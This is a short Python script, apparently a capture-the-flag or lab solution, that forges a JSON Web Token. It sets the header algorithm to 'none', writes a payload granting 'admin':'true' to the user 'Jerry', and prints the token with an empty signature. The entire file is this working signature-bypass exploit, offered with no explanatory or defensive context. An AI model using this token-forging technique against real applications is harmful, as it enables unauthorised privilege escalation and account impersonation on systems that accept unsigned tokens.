# -*- coding:utf-8 -*-

import jwt
import base64


def b64urlencode(data):
    return base64.b64encode(data).replace(b'+', b'-').replace(b'/', b'_').replace(b'=', b'')

print(b64urlencode(b'{"alg":"none"}')+b'.'+b64urlencode(b'{"iat":1573470025,"admin":"true","user":"Jerry"}')+b'.')